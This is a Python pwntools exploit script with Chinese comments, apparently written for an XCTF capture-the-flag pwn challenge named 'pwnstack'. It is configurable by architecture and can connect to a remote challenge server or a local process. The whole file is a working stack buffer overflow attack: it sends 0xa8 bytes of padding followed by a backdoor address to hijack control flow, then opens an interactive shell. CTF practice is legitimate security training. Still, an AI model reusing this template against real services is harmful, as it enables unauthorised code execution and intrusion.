'''
@Author       : 白银
@Date         : 2023-06-01 09:39:22
@LastEditors  : 白银
@LastEditTime : 2023-06-01 09:47:35
@FilePath     : /pwn/pwnstack.py
@Description  : https://adworld.xctf.org.cn/challenges/list
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''


from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './easyheap'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)
# if_remote = 0  # 0为远程
if if_remote == 1:
    # io = remote("192.190.61.139", 8888)
    io = remote("61.147.171.105", 54287)
    # io = remote("node4.buuoj.cn", 27662)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0xa8 # # ida看，buf和r差多少
backdoor = 0x400762
payload = flat(['a' * padding, backdoor])
print(payload)

io.sendline(payload)

io.interactive()